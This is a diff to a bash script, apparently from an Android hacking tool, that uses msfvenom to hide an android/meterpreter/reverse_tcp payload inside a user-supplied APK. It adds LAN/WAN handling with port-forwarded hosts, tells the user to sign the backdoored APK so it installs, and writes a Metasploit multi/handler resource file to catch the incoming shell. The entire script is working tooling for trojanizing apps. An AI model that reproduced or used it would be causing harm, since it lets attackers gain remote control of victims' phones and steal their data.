@@ -1,18 +1,40 @@
 #!/bin/bash
 PWD=$(pwd)
-printf "\e[4;97mCSF \e[0;0;0m> \e[1;31mEnter your input apk (path/name) ==> \e[0m"
+while true
+do
+printf "\e[4;97mCSF \e[0;0;0m> \e[1;31mYou are generating payload for (LAN/WAN) ==> \e[1;92m"
+read lwan
+printf "\n"
+if [[ $lwan == LAN ]] || [[ $lwan == lan ]]; then
+printf "\e[4;97mCSF \e[0;0;0m> \e[1;31mEnter LHOST==>\e[0m "
+read lht
+echo
+printf "\e[4;97mCSF \e[0;0;0m> \e[1;31mEnter LPORT==>\e[0m "
+read lpt
+break
+elif [[ $lwan == WAN ]] || [[ $lwan == wan ]]; then
+printf "\e[4;97mCSF \e[0;0;0m> \e[1;31mEnter forwarded HOST==>\e[0m "
+read flht
+echo
+printf "\e[4;97mCSF \e[0;0;0m> \e[1;31mEnter forwarded PORT==>\e[0m "
+read flpt
+echo
+printf "\e[4;97mCSF \e[0;0;0m> \e[1;31mEnter LPORT==>\e[0m "
+read lpt
+break
+else
+printf "\e[4;97mCSF \e[0;0;0m> \e[1;31mERROR: PLEASE ENTER A VALID OPTION FROM (LAN/lan) and (WAN/wan)\e[0m\n"
+echo
+fi
+done
+printf "\n"
+printf "\e[4;97mCSF \e[0;0;0m> \e[1;31mEnter your input apk (path/name.apk) ==> \e[0m"
 read inputapk
 printf "\n"
-printf "\e[4;97mCSF \e[0;0;0m> \e[1;31mEnter LHOST ==>\e[0m "
-read lht
-printf "\n"
-printf "\e[4;97mCSF \e[0;0;0m> \e[1;31mEnter LPORT ==>\e[0m "
-read lpt
-printf "\n"
-printf "\e[4;97mCSF \e[0;0;0m> \e[1;31mEnter your output payloadbinded apk (path/name) ==> \e[0m"
+printf "\e[4;97mCSF \e[0;0;0m> \e[1;31mEnter your output payloadbinded apk (path/name.apk) ==> \e[0m"
 read outputapk
 printf "\e[1;94mProcessing\e[0m"
-printf "\e[1;94m.\e[om"
+printf "\e[1;94m.\e[0m"
 sleep 0.3
 printf "\e[1;94m.\e[0m"
 sleep 0.3
@@ -23,8 +45,14 @@ sleep 0.3
 printf "\e[1;94m.\e[0m\n"
 sleep 0.3
 printf "\n"
+
+if [[ ${lwan} == lan || ${lwan} == LAN ]]; then
 msfvenom -x $inputapk -p android/meterpreter/reverse_tcp LHOST=$lht LPORT=$lpt --platform android --arch dalvik AndroidMeterpreterDebug=true AndroidWakelock=true ${aapt_arg} -o $outputapk
+elif [[ ${lwan} == wan || ${lwan} == WAN ]]; then
+msfvenom -x $inputapk -p android/meterpreter/reverse_tcp LHOST=$flht LPORT=$flpt --platform android --arch dalvik AndroidMeterpreterDebug=true AndroidWakelock=true ${aapt_arg} -o $outputapk
+fi
 sleep 3
+
 printf "\e[\e[1;34mIn order to make the output apk installable, sign with apk signer\e[0\n"
 printf "\e[\e[1;33myou may download apk signer from playstore:- https://play.google.com/store/apps/details?id=com.haibison.apksigner \e[0m\n"
 sleep 3
@@ -61,7 +89,11 @@ mkdir -p $PREFIX/tmp
 cd $PREFIX/tmp
 echo "use exploit/multi/handler" > run
 echo "set payload android/meterpreter/reverse_tcp" >> run
+if [[ ${lwan} == lan || ${lwan} == LAN ]]; then
 echo "set lhost $lht" >> run
+elif [[ ${lwan} == wan || ${lwan} == WAN ]]; then
+echo "set lhost $flht" >> run
+fi
 echo "set lport $lpt" >> run
 echo "show options" >> run
 echo "exploit" >> run
